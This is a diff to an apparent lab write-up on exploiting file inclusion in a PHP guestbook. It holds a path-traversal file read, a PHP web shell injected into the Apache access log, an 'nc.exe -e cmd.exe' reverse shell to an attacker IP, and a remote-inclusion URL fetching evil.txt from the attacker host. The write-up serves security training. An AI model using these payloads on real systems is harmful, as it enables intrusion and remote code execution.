@@ -18,7 +18,7 @@ Because the LANG field can be controlled, the attacker can put in the path to a 
 
 ### a. Reading arbitrary files
 Windows hosts file:
-`http://10.11.23.188/addguestbook.php?LANG=../../windows/system32/drivers/etc/hosts%00&name=test&comment=test`
+`http://10.11.23.188/addguestbook.php?LANG=../../windows/system32/drivers/etc/hosts%00`
 
 ### b. Contaminating apache log file and executing it
 Use netcat to connect to the server and contaminate `C:/xampp/apache/logs/access.log` file:
@@ -30,11 +30,11 @@ root@kali:~# nc -v 10.11.23.188 80
 ^C
 ```
 After contamination, the access.log file on the serve is like this:
->10.11.0.105 - - [11/Mar/2018:11:24:17 -0400] "GET /addguestbook.php?LANG=../../xampp/apache/logs/access.log%00&cmd=ipconfig&name=test&comment=test HTTP/1.1" 200 369
+>10.11.0.105 - - [11/Mar/2018:11:24:17 -0400] "GET /addguestbook.php?LANG=../../xampp/apache/logs/access.log%00&cmd=ipconfig HTTP/1.1" 200 369
 >10.11.0.105 - - [11/Mar/2018:11:24:48 -0400] "<?php echo shell_exec($_GET['cmd']);?> " 400 366
 
 Display the access.log file to execute the command:
-`http://10.11.23.188/addguestbook.php?LANG=../../xampp/apache/logs/access.log%00&cmd=ipconfig&name=test&comment=test`
+`http://10.11.23.188/addguestbook.php?LANG=../../xampp/apache/logs/access.log%00&cmd=ipconfig`
 
 ### c. Transferring netcat and obtaining reverse shell
 Kali:
@@ -53,7 +53,7 @@ Kali:
 nc -lvp 4444
 ```
 Access this URL to open the shell
-`http://10.11.23.188/addguestbook.php?LANG=../../xampp/apache/logs/access.log%00&cmd=nc.exe%20-e%20cmd.exe%2010.11.0.105%204444&name=test&comment=test`
+`http://10.11.23.188/addguestbook.php?LANG=../../xampp/apache/logs/access.log%00&cmd=nc.exe%20-e%20cmd.exe%2010.11.0.105%204444`
 Note:
 ```bash
 python -c 'import pty; pty.spawn("/bin/sh")'
@@ -62,7 +62,7 @@ is used to get the TTY shell
 
 ## 2. Remote file inclusion (RFI)
 Executing a command via a remote php page:
-http://10.11.23.188/addguestbook.php?LANG=http://10.11.0.105:31/evil.txt%00&name=test&comment=test
+`http://10.11.23.188/addguestbook.php?LANG=http://10.11.0.105:31/evil.txt%00`
 
 Content of `/var/www/html/evil.txt`:
 ```php
